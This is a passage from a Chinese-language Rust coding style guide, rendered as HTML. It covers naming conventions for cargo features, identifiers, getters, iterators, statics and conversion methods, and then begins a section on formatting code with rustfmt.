</span><span class="boring">fn main() {
</span>// 符合： 与标准库错误类型一致
struct ParseAddrError{}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam02--为-cargo-feature-命名时不应含有无意义的占位词"><a class="header" href="#pnam02--为-cargo-feature-命名时不应含有无意义的占位词">P.NAM.02  为 cargo feature 命名时不应含有无意义的占位词</a></h2>
<p><strong>【描述】</strong></p>
<p>给 <a href="http://doc.crates.io/manifest.html#the-features-section">Cargo feature</a> 命名时，不应带有无实际含义的的词语，比如使用<code>abc</code>命名来替代 <code>use-abc</code> 或 <code>with-abc</code>。</p>
<p>这条原则经常出现在对 Rust 标准库进行 <a href="https://doc.rust-lang.org/cargo/reference/features.html#optional-dependencies">可选依赖(optional-dependency)</a> 配置的 crate 上。</p>
<p>并且 Cargo 要求 features 应该是相互叠加的，所以像 <code>no-abc</code> 这种负向的 feature 命名实际上并不正确。</p>
<p><strong>【反例】</strong></p>
<pre><code class="language-toml"># In Cargo.toml


[features]
// 不符合
default = [&quot;use-std&quot;]
std = []
// 不符合
no-abc=[]
</code></pre>
<pre><code class="language-rust ignored">// In lib.rs

#![cfg_attr(not(feature = &quot;use-std&quot;), no_std)]
</code></pre>
<p><strong>【正例】</strong></p>
<p>最简洁且正确的做法是：</p>
<pre><code class="language-toml"># In Cargo.toml

[features]
// 符合
default = [&quot;std&quot;]
std = []
</code></pre>
<pre><code class="language-rust ignored">// In lib.rs

#![cfg_attr(not(feature = &quot;std&quot;), no_std)]
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam03-标识符命名应该符合阅读习惯"><a class="header" href="#pnam03-标识符命名应该符合阅读习惯">P.NAM.03 标识符命名应该符合阅读习惯</a></h2>
<p><strong>【描述】</strong></p>
<p>标识符的命名要清晰、明了，有明确含义，容易理解。符合英文阅读习惯的命名将明显提高代码可读性。</p>
<p>一些好的实践包括但不限于：</p>
<ul>
<li>使用正确的英文单词并符合英文语法，不要使用拼音</li>
<li>仅使用常见或领域内通用的单词缩写</li>
<li>布尔型变量或函数避免使用否定形式，双重否定不利于理解</li>
<li>不要使用 Unicode 标识符</li>
</ul>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 使用拼音
let ming: &amp;str = &quot;John&quot;;
let xing: &amp;str = &quot;Smith&quot;;
// 不符合： 含义不明确
const ERROR_NO_1: u32 = 336;
const ERROR_NO_2: u32 = 594;
// 不符合：函数名字表示的函数作用不明了
fn not_number(s:&amp;str) -&gt; bool {/* ... */}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let first_name: &amp;str = &quot;John&quot;;
let last_name: &amp;str = &quot;Smith&quot;;
const ERR_DIR_NOT_SUPPORTED: u32 = 336;
const ERR_DVER_CANCEL_TIMEOUT: u32 = 594;
// 符合
fn is_number(s:&amp;str) -&gt; bool {/* ... */} 
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam04-作用域越大命名越精确反之应简短"><a class="header" href="#pnam04-作用域越大命名越精确反之应简短">P.NAM.04 作用域越大命名越精确，反之应简短</a></h2>
<p><strong>【描述】</strong></p>
<ol>
<li>对于全局函数、全局变量、宏、类型名、枚举命名，应当精确描述并全局唯一。</li>
<li>对于函数局部变量，或者结构体、枚举中的成员变量，在其命名能够准确表达含义的前提下，应该尽量简短，避免冗余信息重复描述。</li>
</ol>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：描述不精确
static GET_COUNT: i32 = 42;  

// 不符合：信息冗余
enum WebEvent {
    PageLoadEvent,
    PageUnloadEvent,
    KeyPressEvent(char),
    PasteEvent(String),
    ClickEvent { x: i64, y: i64 },
}

// 不符合：信息冗余
type MaskSize = u16; 
pub struct HeaderMap {
    mask: MaskSize,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
static MAX_THREAD_COUNT: i32 = 42;  

// 符合： 上下文信息已经知道它是 Event
enum WebEvent {
    PageLoad,
    PageUnload,
    KeyPress(char),
    Paste(String),
    Click { x: i64, y: i64 },
}

// 符合：在使用它的地方自然就知道是描述谁的大小
type Size = u16; 
pub struct HeaderMap {
    mask: Size,
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam05-用于访问或获取数据的-getter-类方法通常不要使用-get_-前缀"><a class="header" href="#pnam05-用于访问或获取数据的-getter-类方法通常不要使用-get_-前缀">P.NAM.05 用于访问或获取数据的 <code>getter</code> 类方法通常不要使用 <code>get_</code> 前缀</a></h2>
<p><strong>【描述】</strong></p>
<p>因为 Rust 所有权语义的存在，此例子中两个方法的参数分别是共享引用 <code>&amp;self</code> 和 独占引用 <code>&amp;mut self</code>，分别代表了 getter 的语义。</p>
<p>也存在一些例外情况可以用 <code>get_</code> 前缀。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct First;
pub struct Second;

pub struct S {
    first: First,
    second: Second,
}

impl S {
    // 不符合：访问成员函数名字不用get_前缀。
    pub fn get_first(&amp;self) -&gt; &amp;First {
        &amp;self.first
    }

    // 不符合：
    // 同样不建议 `get_mut_first`, or `mut_first`.
    pub fn get_first_mut(&amp;mut self) -&gt; &amp;mut First {
        &amp;mut self.first
    }

    // set_前缀是可以的
    pub fn set_first(&amp;mut self, f: First) -&gt; &amp;mut First {
        self.first = f;
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct First;
pub struct Second;

pub struct S {
    first: First,
    second: Second,
}

impl S {
    // 符合
    pub fn first(&amp;self) -&gt; &amp;First {
        &amp;self.first
    }

    // 符合
    pub fn first_mut(&amp;mut self) -&gt; &amp;mut First {
        &amp;mut self.first
    }

    // set_前缀是可以的
    pub fn set_first(&amp;mut self, f: First)  {
        self.first = f;
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>但也存在例外情况：只有当需要显式的语义来通过<code>getter</code>获取某种数据，才会使用<code>get</code>命名。例如，<code>Cell::get</code>可以访问一个<code>Cell</code>的内容。</p>
<p>对于进行运行时验证的getter，例如边界检查，可以考虑添加一个 Unsafe 的<code>_unchecked</code> 配套方法。一般来说，会有以下签名。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 进行一些运行时验证，例如边界检查
fn get(&amp;self, index: K) -&gt; Option&lt;&amp;V&gt;;
fn get_mut(&amp;mut self, index: K) -&gt; Option&lt;&amp;mut V&gt;;
// 没有运行时验证，用于在某些情况下提升性能。比如，在当前运行环境中不可能发生越界的情况。
unsafe fn get_unchecked(&amp;self, index: K) -&gt; &amp;V;
unsafe fn get_unchecked_mut(&amp;mut self, index: K) -&gt; &amp;mut V;
<span class="boring">}
</span></code></pre></pre>
<p>getter 和类型转换 (<a href="safe-guides/code_style/naming/./G.NAM.02.html">G.NAM.02</a>) 之间的区别很小，大部分时候不那么清晰可辨。比如 <a href="https://docs.rs/tempdir/0.3.7/tempdir/struct.TempDir.html#method.path"><code>TempDir::path</code></a> 可以被理解为临时目录的文件系统路径的 getter ，而 <a href="https://docs.rs/tempdir/0.3.7/tempdir/struct.TempDir.html#method.into_path"><code>TempDir::into_path</code></a> 负责把删除临时目录时转换的数据传给调用者。</p>
<p>因为 <code>path</code> 方法是一个 getter ，如果用 <code>get_path</code> 或者 <code>as_path</code> 会造成信息冗余。</p>
<p>来自标准库的例子：</p>
<ul>
<li><a href="https://doc.rust-lang.org/std/io/struct.Cursor.html#method.get_mut"><code>std::io::Cursor::get_mut</code></a></li>
<li><a href="https://doc.rust-lang.org/std/ptr/struct.Unique.html#method.get_mut"><code>std::ptr::Unique::get_mut</code></a></li>
<li><a href="https://doc.rust-lang.org/std/sync/struct.PoisonError.html#method.get_mut"><code>std::sync::PoisonError::get_mut</code></a></li>
<li><a href="https://doc.rust-lang.org/std/sync/atomic/struct.AtomicBool.html#method.get_mut"><code>std::sync::atomic::AtomicBool::get_mut</code></a></li>
<li><a href="https://doc.rust-lang.org/std/collections/hash_map/struct.OccupiedEntry.html#method.get_mut"><code>std::collections::hash_map::OccupiedEntry::get_mut</code></a></li>
<li><a href="https://doc.rust-lang.org/std/primitive.slice.html#method.get_unchecked"><code>&lt;[T]&gt;::get_unchecked</code></a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam06-遵循-iter-iter_mut-into_iter-规范来生成迭代器"><a class="header" href="#pnam06-遵循-iter-iter_mut-into_iter-规范来生成迭代器">P.NAM.06 遵循 <code>iter/ iter_mut/ into_iter</code> 规范来生成迭代器</a></h2>
<p><strong>【描述】</strong></p>
<p>此规则包含两条基本子规则：</p>
<ol>
<li>对于容纳 <code>U</code> 类型的容器 (container) ，其迭代器方法应该遵循<code>iter/ iter_mut/ into_iter</code> 这三种命名方式。</li>
<li>返回的迭代器类型名称也应该和其方法名保持一致，如一个叫做<code>into_iter()</code>的方法应该返回一个叫做<code>IntoIter</code>的类型。</li>
</ol>
<p>说明：</p>
<ul>
<li>规则一适用于在概念上属于同质集合的数据结构的方法，而非函数。例如，第三方库 <code>url</code>  中的 <a href="https://docs.rs/url/1.4.0/url/percent_encoding/fn.percent_encode.html">percent_encode</a> 返回一个 URL 编码的字符串片段的迭代器，使用<code>iter/iter_mut/into_iter</code>约定的话，函数名就会失去明确的语义。</li>
<li>规则二同样主要适用于方法，但通常对函数也有意义。例如，第三方库 <code>url</code>  中的 <a href="https://docs.rs/url/1.4.0/url/percent_encoding/fn.percent_encode.html">percent_encode</a> 返回一个<code>PercentEncode</code> 类型的迭代器。</li>
</ul>
<p><strong>【反例】</strong></p>
<pre><code class="language-rust ignored">// 不符合：没必要加 `to_` 前缀
fn to_iter(&amp;self) -&gt; Iter             // Iter 实现 Iterator&lt;Item = &amp;U&gt;
fn to_iter_mut(&amp;mut self) -&gt; IterMut  // IterMut 实现 Iterator&lt;Item = &amp;mut U&gt;
fn to_into_iter(self) -&gt; IntoIter     // IntoIter 实现 Iterator&lt;Item = U&gt;
</code></pre>
<p><strong>【正例】</strong></p>
<pre><code class="language-rust ignored">// 符合
fn iter(&amp;self) -&gt; Iter             // Iter 实现 Iterator&lt;Item = &amp;U&gt;
fn iter_mut(&amp;mut self) -&gt; IterMut  // IterMut 实现 Iterator&lt;Item = &amp;mut U&gt;
fn into_iter(self) -&gt; IntoIter     // IntoIter 实现 Iterator&lt;Item = U&gt;
</code></pre>
<p><strong>【例外】</strong></p>
<p>标准库中存在一个例外： <code>str</code> 类型是有效 UTF-8 字节的切片（slice），概念上与同质集合略有差别，所以 <code>str</code> 没有提供 <code>iter</code>/<code>iter_mut</code>/<code>into_iter</code> 命名的迭代器方法，而是提供 <a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.bytes"><code>str::bytes</code></a> 方法来输出字节迭代器、 <a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.chars"><code>str::chars</code></a> 方法来输出字符迭代器。</p>
<p><strong>【参考】</strong></p>
<p>参考 [RFC 199]: https://github.com/rust-lang/rfcs/blob/master/text/0199-ownership-variants.md</p>
<p>还有有一些来自标准库的例子可参考：</p>
<ul>
<li><a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.iter"><code>Vec::iter</code></a></li>
<li><a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.iter_mut"><code>Vec::iter_mut</code></a></li>
<li><a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.into_iter"><code>Vec::into_iter</code></a></li>
<li><a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html#method.iter"><code>BTreeMap::iter</code></a></li>
<li><a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html#method.iter_mut"><code>BTreeMap::iter_mut</code></a></li>
<li><a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html#method.keys"><code>BTreeMap::keys</code></a>  返回 [<code>Keys</code>]<a href="https://doc.rust-lang.org/std/collections/btree_map/struct.Keys.html">btree_map::Keys</a></li>
<li><a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html#method.values"><code>BTreeMap::values</code></a> 返回 [<code>Values</code>]<a href="https://doc.rust-lang.org/std/collections/btree_map/struct.Values.html">btree_map::Values</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam07-避免使用语言内置保留字关键字内置类型和trait等特殊名称"><a class="header" href="#pnam07-避免使用语言内置保留字关键字内置类型和trait等特殊名称">P.NAM.07 避免使用语言内置保留字、关键字、内置类型和<code>trait</code>等特殊名称</a></h2>
<p><strong>【描述】</strong></p>
<p>命名必须要避免使用语言内置的保留字、关键字、内置类型和<code>trait</code>等特殊名称。 具体可以参考<a href="https://doc.rust-lang.org/stable/reference/keywords.html">The Rust Reference-Keywords</a>。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 不符合：Rust 内置了 Sized trait 
type Sized = u16; 

fn main() {
    // 不符合：try 为保留关键字
    let try = 1;
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 符合
type Size = u16; 

fn main() {
    // 符合
    let tried = 1;
}
</code></pre></pre>
<p><strong>【例外】</strong></p>
<p>在一些特定场合，比如对接遗留数据库中的字段和Rust关键字冲突：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>struct SomeTable{
    // 使用 `r#`+type 来解决这种问题
    r#type: String
}

<span class="boring">}
</span></code></pre></pre>
<p>或者当序列化为 json 或 proto 时，存在成员为关键字，则可以通过相关库提供的功能来使用：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct UserRepr {
    // ...
    #[serde(rename=&quot;self&quot;)]
    pub self_: Option&lt;String&gt;,
    // ...
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam08--避免在变量的命名中添加类型标识"><a class="header" href="#pnam08--避免在变量的命名中添加类型标识">P.NAM.08  避免在变量的命名中添加类型标识</a></h2>
<p><strong>【描述】</strong></p>
<p>因为 Rust 语言类型系统崇尚显式的哲学，所以不需要在变量命名中也添加关于类型的标识。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let account_bytes: Vec&lt;u8&gt; = read_some_input();   // 不符合：account 的类型很清楚，没必要在命名中加 `_bytes`
let account_str = String::from_utf8(account_bytes)?; // 不符合：account 的类型很清楚，没必要在命名中加 `_str`
let account: Account = account_str.parse()?;   // 不符合：account 的类型很清楚，没必要在命名中加 `_str`
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let account: Vec&lt;u8&gt; = read_some_input();   // 符合
let account = String::from_utf8(account)?;  // 符合
let account: Account = account.parse()?;   // 符合
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pnam09-定义全局静态变量时需加前缀g_以便和常量有所区分"><a class="header" href="#pnam09-定义全局静态变量时需加前缀g_以便和常量有所区分">P.NAM.09 定义全局静态变量时需加前缀<code>G_</code>以便和常量有所区分</a></h2>
<p><strong>【描述】</strong></p>
<p>为了提升代码可读性和可维护性，有必要将常量的命名和全局静态变量加以区分。所以在定义全局静态变量时，需要以前缀<code>G_</code>命名。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合： 无法通过命名直接区分常量和静态变量
static EVENT: [i32;5]=[1,2,3,4,5];
const MAGIC_NUM: i32 = 65 ;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
static G_EVENT: [i32;5]=[1,2,3,4,5];
const MAGIC_NUM: i32 = 65 ;
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gnam01-使用统一的命名风格"><a class="header" href="#gnam01-使用统一的命名风格">G.NAM.01 使用统一的命名风格</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>Rust 倾向于在“类型”级的结构中使用驼峰（ <code>UpperCamelCase</code>） 命名风格，在 “变量、值（实例）、函数名”等结构中使用蛇形（ <code>snake_case</code>）命名风格。</p>
<p>下面是汇总信息：</p>
<table><thead><tr><th>Item</th><th>规范</th></tr></thead><tbody>
<tr><td>包（Crates）</td><td><a href="https://github.com/rust-lang/api-guidelines/issues/29">通常使用 snake_case</a> <sup class="footnote-reference"><a href="#crate-name">1</a></sup></td></tr>
<tr><td>模块（Modules）</td><td><code>snake_case</code></td></tr>
<tr><td>类型（Types）</td><td><code>UpperCamelCase</code></td></tr>
<tr><td>特质（Traits）</td><td><code>UpperCamelCase</code></td></tr>
<tr><td>枚举体（Enum variants）</td><td><code>UpperCamelCase</code></td></tr>
<tr><td>函数（Functions）</td><td><code>snake_case</code></td></tr>
<tr><td>方法（Methods）</td><td><code>snake_case</code></td></tr>
<tr><td>通用构造函数（General constructors）</td><td><code>new</code> 或者 <code>with_more_details</code></td></tr>
<tr><td>转换构造函数（Conversion constructors）</td><td><code>from_some_other_type</code></td></tr>
<tr><td>宏（Macros）</td><td><code>snake_case!</code></td></tr>
<tr><td>本地变量（Local variables）</td><td><code>snake_case</code></td></tr>
<tr><td>静态变量（Statics）</td><td><code>SCREAMING_SNAKE_CASE</code></td></tr>
<tr><td>常量（Constants）</td><td><code>SCREAMING_SNAKE_CASE</code></td></tr>
<tr><td>类型参数（Type parameters）</td><td>简明的 <code>UpperCamelCase</code> ，通常使用单个大写字母： <code>T</code></td></tr>
<tr><td>生存期（Lifetimes）</td><td>简短的 <code>lowercase</code>，通常使用单个小写字母 <code>'a</code>, <code>'de</code>, <code>'src</code>，尽量保持语义</td></tr>
<tr><td>特性（Features）</td><td><code>snake_case</code></td></tr>
</tbody></table>
<p>说明 :</p>
<ol>
<li>在 <code>UpperCamelCase</code>情况下，由首字母缩写组成的缩略语和 复合词的缩写，算作单个词。比如，应该使用 <code>Uuid</code> 而非 <code>UUID</code>，使用 <code>Usize</code> 而不是 <code>USize</code>，或者是 <code>Stdin</code> 而不是 <code>StdIn</code>。</li>
<li>在<code>snake_case</code>中，首字母缩写和缩略词是小写的 <code>is_xid_start</code>。</li>
<li>在 <code>snake_case</code> 或者 <code>SCREAMING_SNAKE_CASE</code> 情况下，每个词不应该由单个字母组成——除非这个字母是最后一个词。比如，使用 <code>btree_map</code> 而不使用 <code>b_tree_map</code>，使用 <code>PI_2</code> 而不使用 <code>PI2</code> 。</li>
</ol>
<p>关于包命名：</p>
<ul>
<li>由于历史问题，包名有两种形式 <code>snake_case</code> 或 <code>kebab-case</code> ，但实际在代码中需要引入包名的时候，Rust 只能识别 <code>snake_case</code>，也会自动将 <code>kebab-case</code> 识别为  <code>kebab_case</code>。所以建议使用<code>snake_case</code>。</li>
<li>Crate 的名称通常不应该使用 <code>-rs</code> 或者 <code>-rust</code> 作为后缀或者前缀。但是有些情况下，比如是其他语言移植的同名 Rust 实现，则可以使用 <code>-rs</code> 后缀来表明这是 Rust 实现的版本。</li>
</ul>
<p><strong>【参考】</strong></p>
<p>Rust 命名规范在 <a href="https://github.com/rust-lang/rfcs/blob/master/text/0430-finalizing-naming-conventions.md">RFC 0430</a> 中有也描述。</p>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th></tr></thead><tbody>
<tr><td><a href="https://doc.rust-lang.org/rustc/lints/listing/warn-by-default.html#non-camel-case-types"><code>Rustc: non_camel_case_types</code></a></td><td>no</td><td>yes</td><td>Style</td></tr>
<tr><td><a href="https://doc.rust-lang.org/rustc/lints/listing/warn-by-default.html#non-snake-case"><code>Rustc: non_snake_case</code></a></td><td>no</td><td>yes</td><td>Style</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gnam02-类型转换函数命名需要遵循所有权语义"><a class="header" href="#gnam02-类型转换函数命名需要遵循所有权语义">G.NAM.02 类型转换函数命名需要遵循所有权语义</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>进行特定类型转换的方法名应该包含以下前缀：</p>
<table><thead><tr><th>名称前缀</th><th>内存代价</th><th>所有权</th></tr></thead><tbody>
<tr><td><code>as_</code></td><td>无代价</td><td>borrowed -&gt; borrowed</td></tr>
<tr><td><code>to_</code></td><td>代价昂贵</td><td>borrowed -&gt; borrowed<br>borrowed -&gt; owned (非 Copy 类型)<br>owned -&gt; owned (Copy 类型)</td></tr>
<tr><td><code>into_</code></td><td>看情况</td><td>owned -&gt; owned (非 Copy 类型)</td></tr>
</tbody></table>
<p>以 <code>as_</code> 和 <code>into_</code> 作为前缀的类型转换通常是 <em>降低抽象层次</em> ，要么是查看背后的数据 ( <code>as</code> ) ，要么是分解 (deconstructe) 背后的数据 ( <code>into</code> ) 。
相对来说，以 <code>to_</code> 作为前缀的类型转换处于同一个抽象层次，但是底层会做更多工作，比如多了内存拷贝等操作。</p>
<p>当一个类型用更高级别的语义 (higher-level semantics) 封装 (wraps) 一个内部类型时，应该使用 <code>into_inner()</code> 方法名来取出被封装类型的值。</p>
<p>这适用于以下封装器：</p>
<p>读取缓存 (<a href="https://doc.rust-lang.org/std/io/struct.BufReader.html#method.into_inner"><code>BufReader</code></a>) 、编码或解码 (<a href="https://docs.rs/flate2/1.0.22/flate2/read/struct.GzDecoder.html#method.into_inner"><code>GzDecoder</code></a>) 、取出原子 (<a href="https://doc.rust-lang.org/std/sync/atomic/struct.AtomicBool.html#method.into_inner"><code>AtomicBool</code></a> 、
或者任何相似的语义封装 (<a href="https://doc.rust-lang.org/stable/std/io/struct.BufWriter.html#method.into_inner"><code>BufWriter</code></a>)。</p>
<p><strong>【正例】</strong></p>
<p>标准库 API 命名有如下示例：</p>
<ul>
<li><code>as_</code>
<ul>
<li><a href="https://doc.rust-lang.org/std/primitive.str.html#method.as_bytes"><code>str::as_bytes()</code></a> 
用于查看 UTF-8 字节的 <code>str</code> 切片，这是无内存代价的（不会产生内存分配）。 传入值是 <code>&amp;str</code> 类型，输出值是 <code>&amp;[u8]</code> 类型。</li>
</ul>
</li>
<li><code>to_</code>
<ul>
<li>[<code>Path::to_str</code>] (https://doc.rust-lang.org/stable/std/path/struct.Path.html#method.to_str)
对操作系统路径进行 UTF-8 字节检查，开销昂贵。
虽然输入和输出都是借用，但是这个方法对运行时产生不容忽视的代价，
所以不应使用 <code>as_str</code> 名称。</li>
<li>[<code>str::to_lowercase()</code>] (https://doc.rust-lang.org/std/primitive.str.html#method.to_lowercase)
生成正确的 Unicode 小写字符，
涉及遍历字符串的字符，可能需要分配内存。
输入值是 <code>&amp;str</code> 类型，输出值是 <code>String</code> 类型。</li>
<li>[<code>f64::to_radians()</code>] (https://doc.rust-lang.org/std/primitive.f64.html#method.to_radians)
把浮点数的角度制转换成弧度制。
输入和输出都是 <code>f64</code> 。没必要传入 <code>&amp;f64</code> ，因为复制 <code>f64</code> 花销很小。
但是使用 <code>into_radians</code> 名称就会具有误导性，因为输入数据没有被消耗。</li>
</ul>
</li>
<li><code>into_</code>
<ul>
<li><a href="https://doc.rust-lang.org/std/string/struct.String.html#method.into_bytes"><code>String::into_bytes()</code></a>
从 <code>String</code> 提取出背后的 <code>Vec&lt;u8&gt;</code> 数据，这是无代价的。
它转移了 <code>String</code> 的所有权，然后返回具有所有权的 <code>Vec&lt;u8&gt;</code> 。</li>
<li>[<code>BufReader::into_inner()</code>] (https://doc.rust-lang.org/std/io/struct.BufReader.html#method.into_inner)
转移了 buffered reader 的所有权，取出其背后的 reader ，这是无代价的。
存于缓冲区的数据被丢弃了。</li>
<li>[<code>BufWriter::into_inner()</code>] (https://doc.rust-lang.org/std/io/struct.BufWriter.html#method.into_inner)
转移了 buffered writer 的所有权，取出其背后的 writer ，这可能以很大的代价刷新所有缓存数据。</li>
</ul>
</li>
</ul>
<p>如果类型转换方法返回的类型具有 <code>mut</code> 修饰，那么这个方法的名称应如同返回类型组成部分的顺序那样，带有 <code>mut</code> 。
比如 <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#method.as_mut_slice"><code>Vec::as_mut_slice</code></a> 返回 <code>&amp;mut [T]</code> 类型，这个方法的功能正如其名称所述，所以这个名称优于 <code>as_slice_mut</code> 。</p>
<p>其他参考示例：</p>
<ul>
<li><a href="https://doc.rust-lang.org/std/result/enum.Result.html#method.as_ref"><code>Result::as_ref</code></a></li>
<li><a href="https://doc.rust-lang.org/std/cell/struct.RefCell.html#method.as_ptr"><code>RefCell::as_ptr</code></a></li>
<li><a href="https://doc.rust-lang.org/std/primitive.slice.html#method.to_vec"><code>slice::to_vec</code></a></li>
<li><a href="https://doc.rust-lang.org/std/option/enum.Option.html#method.into_iter"><code>Option::into_iter</code></a></li>
</ul>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>Lint Level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/index.html#wrong_self_convention">wrong_self_convention</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="22-格式"><a class="header" href="#22-格式">2.2 格式</a></h1>
<p>制定统一的编码风格，是为了提升代码的可读性，让日常代码维护和团队之间审查代码更加方便。</p>
<p>Rust 有自动化格式化工具 rustfmt ，可以帮助开发者摆脱手工调整代码格式的工作，提升生产力。但是，rustfmt 遵循什么样的风格规范，作为开发者需要了解，在编写代码的时候可以主动按这样的风格编写。</p>
<p>说明：</p>
<p>对于 <code>rustfmt</code> 中未稳定的配置项（<code>Stable</code>为<code>No</code>），则表示该配置项不能在稳定版（Stable）Rust 中更改配置，但其默认值会在<code>cargo fmt</code>时生效。在 Nightly Rust 下则都可以自定义配置。</p>
<p>如需了解在稳定版 Rust 中使用未稳定配置项的方法、配置示例及其他全局配置项说明，请参阅：<a href="safe-guides/code_style/./../Appendix/tools/rustfmt.html">Rustfmt 配置相关说明</a> 。</p>
<p><strong>【注意事项】</strong></p>
<p>因为 rustfmt 工具会自动修改代码，为了确保 rustfmt 不会因为意外而改错代码，所以在使用 rustfmt 时应该注意下面两项描述：</p>
<ol>
<li>务必保证在全部把代码修改完毕且编译通过之后再执行 rustfmt 命令。 因为 rustfmt 执行过程中不会对代码进行编译，所以就不会有静态检查保护。</li>
<li>如果是使用 IDE 或 编辑器的时候开启了自动保护功能，就不要开启自动执行 rustfmt 功能。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pfmt01--使用-rustfmt-进行自动格式化代码"><a class="header" href="#pfmt01--使用-rustfmt-进行自动格式化代码">P.FMT.01  使用 rustfmt 进行自动格式化代码</a></h2>
<p><strong>【描述】</strong></p>
<p>应该总是在项目中添加 <code>rustfmt.toml</code> 或 <code>.rustfmt.toml</code>文件。即使它是空文件，这是向潜在的合作者表明你希望代码是自动格式化的。</p>
<p><strong>【例外】</strong></p>
<p>在特殊的情况下，可以通过条件编译属性 <code>#[cfg_attr(rustfmt, rustfmt_skip)]</code> 或 <code>#[rustfmt::skip]</code> 来关闭自动格式化。</p>
<p>比如下面示例：</p>
<p><code>vec!</code> 中的元素排布是固定格式，这样有助于开发的便利。</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let got = vec![
            0x00, 0x05, 0x01, 0x00,
            0xff,
            0x00,
            0x00,
    
            0x01, 0x0c, 0x02, 0x00,
            0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef,
            b'd', b'e', b'a', b'd', b'b', b'e', b'e', b'f', 0x00,
            0x00,
    
            127, 0x06, 0x03, 0x00,
            0x01, 0x02,
            b'a', b'b', b'c', b'd', 0x00,
            b'1', b'2', b'3', b'4', 0x00,
            0x00,
    ];
}
</code></pre></pre>
<p>如果使用 自动格式化，会变成：</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let got = vec![
        0x00, 0x05, 0x01, 0x00, 0xff, 0x00, 0x00, 0x01, 0x0c, 0x02, 0x00, 0xde, 0xad, 0xbe, 0xef,
        0xde, 0xad, 0xbe, 0xef, b'd', b'e', b'a', b'd', b'b', b'e', b'e', b'f', 0x00, 0x00, 127,
        0x06, 0x03, 0x00, 0x01, 0x02, b'a', b'b', b'c', b'd', 0x00, b'1', b'2', b'3', b'4', 0x00,
        0x00,
    ];
}
</code></pre></pre>
<p>但是加上 <code>#[rustfmt::skip]</code> 就不会被自动格式化影响：</p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    #[rustfmt::skip] 
    let got = vec![
